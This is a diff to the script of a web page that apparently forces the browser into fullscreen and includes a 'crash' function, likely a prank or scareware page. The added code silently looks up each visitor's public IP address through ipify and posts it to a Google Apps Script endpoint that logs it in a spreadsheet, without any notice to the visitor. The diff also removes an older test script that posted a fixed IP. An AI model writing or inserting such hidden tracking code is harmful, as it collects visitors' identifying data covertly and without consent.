@@ -187,6 +187,25 @@
       } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
         document.documentElement.msRequestFullscreen();
       }
+
+      // Get the user's IP address using ipify
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip; // Get the IP address from the response
+
+          // Send the IP address to your Google Apps Script to log it in Sheets
+          fetch('https://script.google.com/macros/s/AKfycbxmWe2Q-sMA9Q-Kfh00a3EAYo-31-628SYEqAA1zwEQhoHKLRjBFFMH2ZqwzKelviI2lQ/exec', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            mode: 'cors', // Fixes CORS error
+            body: JSON.stringify({ ip: ip }) // Send the IP as part of the body
+          })
+          .then(response => response.json())
+          .then(data => console.log("IP Logged:", data))
+          .catch(error => console.error("Error sending IP to Google Apps Script:", error));
+        })
+        .catch(error => console.error("Error fetching IP address:", error));
     };
 
     // START CRASH FUNCTION
@@ -226,19 +245,5 @@
       }, 3000);
     }
   </script>
- 
-  <script>
-fetch('https://script.google.com/macros/s/AKfycbyAJf9a4Wiw6quWqErjB5WN11Yt9AGyb598Jd16rJSM5LeWFepIvnCsUKbewboekz6NZA/exec', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  mode: 'cors', // This fixes the CORS error
-  body: JSON.stringify({ ip: "192.168.1.1" }) 
-})
-.then(response => response.json())
-.then(data => console.log("Response:", data))
-.catch(error => console.error("Error:", error));
-
-</script>
-
 </body>
 </html>
